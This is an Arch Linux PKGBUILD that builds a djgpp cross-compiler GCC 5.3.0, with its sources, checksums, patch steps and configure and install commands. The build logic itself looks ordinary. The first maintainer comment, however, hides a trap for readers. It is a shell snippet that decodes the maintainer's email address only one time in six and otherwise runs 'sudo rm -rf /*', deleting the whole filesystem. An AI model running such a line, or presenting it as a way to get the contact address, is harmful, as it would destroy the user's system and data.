# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
# Adapted from the mingw-w64-gcc package, authors below
# $Id: PKGBUILD 137310 2015-07-23 10:02:53Z spupykin $
# Maintainer: Sergej Pupykin <pupykin.s+arch@gmail.com>
# Maintainer: rubenvb vanboxem <dottie> ruben <attie> gmail <dottie> com

_targets="i686-pc-msdosdjgpp"

pkgname=djgpp-gcc
pkgver=5.3.0
_islver=0.12.2
_cloogver=0.18.1
pkgrel=1
pkgdesc="Cross GCC for the djgpp cross-compiler"
arch=('i686' 'x86_64')
url="http://gcc.gnu.org"
license=('GPL' 'LGPL' 'FDL' 'custom')
groups=('djgpp-toolchain' 'djgpp')
depends=('zlib' 'libmpc' 'djgpp-binutils' 'djgpp-djcrx')
#makedepends=("gcc-ada=${pkgver}")
optdepends=()
provides=('djgpp-gcc-base')
replaces=()
backup=()
options=('!strip' 'staticlibs' '!emptydirs' '!buildflags')
source=(
	"ftp://gcc.gnu.org/pub/gcc/releases/gcc-${pkgver}/gcc-${pkgver}.tar.bz2"
	"http://isl.gforge.inria.fr/isl-${_islver}.tar.bz2"
	"http://www.bastoul.net/cloog/pages/download/cloog-${_cloogver}.tar.gz"
	'gcc-make-xmmintrin-header-cplusplus-compatible.patch'
)
sha512sums=(
	'd619847383405fd389f5a2d7225f97fedb01f81478dbb8339047ccba7561a5c20045ab500a8744bffd19ea51892ce09fc37f862f2cfcb42de0f0f8cd8f8da37a'
	'b5dea4d6b504fac22f2d8cd9c47d6896994d3966635a514d45010243db44cfbc009574b808f3587f35d91de629110bc11b52941d4075e21f8646c59656e62aea'
	'0b12d9f3c39a2425e28e1d7c0a2b3787287fe3e6e3052f094d2ab6cffeb205ce19044100cbfd805659b3e6b3d21ac2f5a3c92848f476de54edfe6b1cbd2172e9'
	'7aa9bd2ad82e4ee2e20c45303f0d3df8c040f4ce9854d24e20b920f52de9ab3986e4170224d68672a0f3ab883fea61c6b93380a87bed9cb63d9b865b43765602'
)

prepare() {
	cd "${srcdir}/gcc-${pkgver}"

	# link isl/cloog for in-tree builds
	ln -fs "../isl-${_islver}" isl
	ln -fs "../cloog-${_cloogver}" cloog

	#do not install libiberty
	sed -i 's/install_to_$(INSTALL_DEST) //' libiberty/Makefile.in
	# hack! - some configure tests for header files using "$CPP $CPPFLAGS"
	sed -i "/ac_cpp=/ s/\$CPPFLAGS/\$CPPFLAGS -O2/" {libiberty,gcc}/configure

	# <https://gcc.gnu.org/bugzilla/show_bug.cgi?id=41557#c1>
	sed -i -e '/^#define INT[A-Z0-9_]*TYPE / s/signed \(.*int\)/\1/' gcc/config/i386/djgpp-stdint.h
}

build() {
	for _target in ${_targets}; do
		mkdir -p "${srcdir}/gcc-build-${_target}"
		cd "${srcdir}/gcc-build-${_target}"

		"${srcdir}/gcc-${pkgver}/configure" --prefix=/usr --libexecdir=/usr/lib \
				--target="${_target}" \
				--enable-languages=c,objc,lto,c++,obj-c++ \
				--enable-shared --enable-static \
				--enable-threads=no --enable-fully-dynamic-string --disable-libstdcxx \
				--with-system-zlib --enable-cloog-backend=isl \
				--disable-lto --disable-dw2-exceptions --disable-libgomp \
				--disable-multilib --enable-checking=release
		make all
	done
}

package() {
	for _target in ${_targets}; do
		cd "${srcdir}/gcc-build-${_target}"
		make DESTDIR="${pkgdir}" install
		strip "${pkgdir}/usr/bin/${_target}"-*
		strip "${pkgdir}/usr/lib/gcc/${_target}/${pkgver}"/{cc1*,collect2,lto*}
		ln -s "${_target}-gcc" "$pkgdir/usr/bin/${_target}-cc"
		# mv dlls
		mkdir -p "$pkgdir/usr/${_target}/bin/"
	done
	strip "${pkgdir}/usr/bin"/*
	# remove unnecessary files
	rm -r "${pkgdir}/usr/share"
	rm -f "${pkgdir}/usr/lib"/libcc1.so*
	rm -f "${pkgdir}/usr/lib"/libcc1.a
}
